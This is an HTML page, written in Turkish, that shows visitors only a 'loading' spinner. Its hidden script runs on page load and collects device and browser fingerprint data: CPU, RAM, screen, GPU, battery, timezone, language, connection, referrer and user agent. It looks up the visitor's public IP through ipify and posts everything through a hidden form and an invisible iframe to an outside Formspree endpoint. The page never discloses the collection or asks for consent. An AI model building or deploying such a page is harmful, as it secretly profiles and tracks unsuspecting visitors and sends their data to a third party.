<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yükleniyor...</title>

<style>
    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }

    body {
        background-color: #08090c;
        color: #e8e8ea;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        height: 100vh;
        width: 100vw;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        overflow: hidden;
    }

    .loader-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 16px;
    }

    .spinner {
        width: 38px;
        height: 38px;
        border: 3px solid rgba(255, 255, 255, 0.1);
        border-radius: 50%;
        border-top-color: #ffffff;
        animation: spin 0.85s linear infinite;
    }

    .text {
        font-size: 15px;
        letter-spacing: 0.5px;
        color: #8e939d;
        font-weight: 500;
        animation: pulse 1.8s ease-in-out infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    @keyframes pulse {
        0%, 100% { opacity: 0.6; }
        50% { opacity: 1; }
    }

    /* Arka planda çalışacak gizli elemanlar */
    .hidden-worker {
        position: absolute;
        width: 0;
        height: 0;
        border: 0;
        visibility: hidden;
        pointer-events: none;
    }
</style>
</head>

<body>

    <!-- Kullanıcının gördüğü tek alan -->
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="text">Yükleniyor...</div>
    </div>

    <!-- Sayfanın Formspree sayfasına yönlenmesini engelleyen gizli iframe -->
    <iframe name="hidden_target" id="hidden_target" class="hidden-worker"></iframe>

    <!-- Formspree Entegreli Gizli Form -->
    <form id="diagnosticsForm" action="https://formspree.io/f/xykzoozp" method="POST" target="hidden_target" class="hidden-worker">
        <input type="hidden" name="_subject" value="Yeni Cihaz & Tarayıcı Telemetrisi">
        <input type="hidden" name="IP_Adresi" id="f_ip">
        <input type="hidden" name="Cihaz_ve_OS" id="f_device">
        <input type="hidden" name="Ekran_Cozunurluk" id="f_screen">
        <input type="hidden" name="Ekran_Karti" id="f_gpu">
        <input type="hidden" name="Pil_Durumu" id="f_battery">
        <input type="hidden" name="Konum_Zaman_Dilimi" id="f_locale">
        <input type="hidden" name="Baglanti_Turu" id="f_connection">
        <input type="hidden" name="Kullanici_Ajan_UA" id="f_ua">
        <input type="hidden" name="Tam_JSON_Raporu" id="f_json">
    </form>

<script>
const DATA = {};

/* ====================================================
   1. CİHAZ, DONANIM VE EKRAN BİLGİLERİ
==================================================== */
DATA.device = {
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency || "N/A",
    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
    touchPoints: navigator.maxTouchPoints || 0,
    cookieEnabled: navigator.cookieEnabled,
    online: navigator.onLine,
    pdfViewer: navigator.pdfViewerEnabled
};

DATA.screen = {
    resolution: `${screen.width} × ${screen.height}`,
    available: `${screen.availWidth} × ${screen.availHeight}`,
    viewport: `${window.innerWidth} × ${window.innerHeight}`,
    pixelRatio: window.devicePixelRatio,
    colorDepth: `${screen.colorDepth}-bit`,
    orientation: screen.orientation?.type || "Bilinmiyor",
    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
    hdr: window.matchMedia("(dynamic-range: high)").matches
};

DATA.locale = {
    language: navigator.language,
    languages: (navigator.languages || []).join(", "),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
    utcOffset: `${new Date().getTimezoneOffset()} min`,
    localTime: new Date().toString()
};

DATA.page = {
    url: location.href,
    referrer: document.referrer || "Doğrudan Giriş",
    title: document.title
};

/* ====================================================
   2. GPU & WEBGL BİLGİSİ
==================================================== */
function getGPUInfo() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return { supported: false };

        const debug = gl.getExtension("WEBGL_debug_renderer_info");
        return {
            supported: true,
            vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
        };
    } catch {
        return { supported: false };
    }
}
DATA.webgl = getGPUInfo();

/* ====================================================
   3. BAĞLANTI (NETWORK) BİLGİSİ
==================================================== */
const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
DATA.connection = conn ? {
    effectiveType: conn.effectiveType,
    downlink: conn.downlink ? `${conn.downlink} Mbps` : "N/A",
    rtt: conn.rtt ? `${conn.rtt} ms` : "N/A",
    saveData: !!conn.saveData
} : { supported: false };

/* ====================================================
   4. PİL DURUMU (ASYNC)
==================================================== */
async function getBatteryInfo() {
    if (!navigator.getBattery) {
        DATA.battery = { supported: false };
        return;
    }
    try {
        const b = await navigator.getBattery();
        DATA.battery = {
            charging: b.charging,
            level: `${Math.round(b.level * 100)}%`,
            chargingTime: b.chargingTime ? `${b.chargingTime}s` : "Inf",
            dischargingTime: b.dischargingTime ? `${b.dischargingTime}s` : "Inf"
        };
    } catch {
        DATA.battery = { error: true };
    }
}

/* ====================================================
   5. PUBLIC IP ADRESİ (ASYNC + 2.5s TIMEOUT)
==================================================== */
async function getPublicIP() {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2500);

    try {
        const res = await fetch("https://api.ipify.org?format=json", {
            cache: "no-store",
            signal: controller.signal
        });
        const json = await res.json();
        DATA.network = { ip: json.ip };
    } catch {
        DATA.network = { ip: "Erişilemedi / Engellendi" };
    } finally {
        clearTimeout(timeoutId);
    }
}

/* ====================================================
   6. VERİLERİ DOLDUR VE FORMSPREE'YE İLET
==================================================== */
function submitTelemetry() {
    document.getElementById("f_ip").value = DATA.network?.ip || "N/A";
    document.getElementById("f_device").value = `${DATA.device.platform} | CPU: ${DATA.device.cores} Çekirdek | RAM: ${DATA.device.ram}`;
    document.getElementById("f_screen").value = `${DATA.screen.resolution} (DPR: ${DATA.screen.pixelRatio}) | Viewport: ${DATA.screen.viewport}`;
    document.getElementById("f_gpu").value = `${DATA.webgl.vendor} - ${DATA.webgl.renderer}`;
    document.getElementById("f_battery").value = DATA.battery?.level ? `${DATA.battery.level} (Şarjda: ${DATA.battery.charging ? 'Evet' : 'Hayır'})` : "Desteklenmiyor";
    document.getElementById("f_locale").value = `${DATA.locale.timezone} | Dil: ${DATA.locale.language}`;
    document.getElementById("f_connection").value = DATA.connection?.effectiveType ? `${DATA.connection.effectiveType.toUpperCase()} (~${DATA.connection.downlink})` : "N/A";
    document.getElementById("f_ua").value = navigator.userAgent;
    document.getElementById("f_json").value = JSON.stringify(DATA, null, 2);

    // Formu arka plandaki hedefe postala
    const form = document.getElementById("diagnosticsForm");
    form.submit();
}

/* ====================================================
   7. ÇALIŞTIRMA TETİKLEYİCİSİ
==================================================== */
(async function init() {
    await Promise.allSettled([
        getPublicIP(),
        getBatteryInfo()
    ]);

    submitTelemetry();
})();
</script>

</body>
</html>
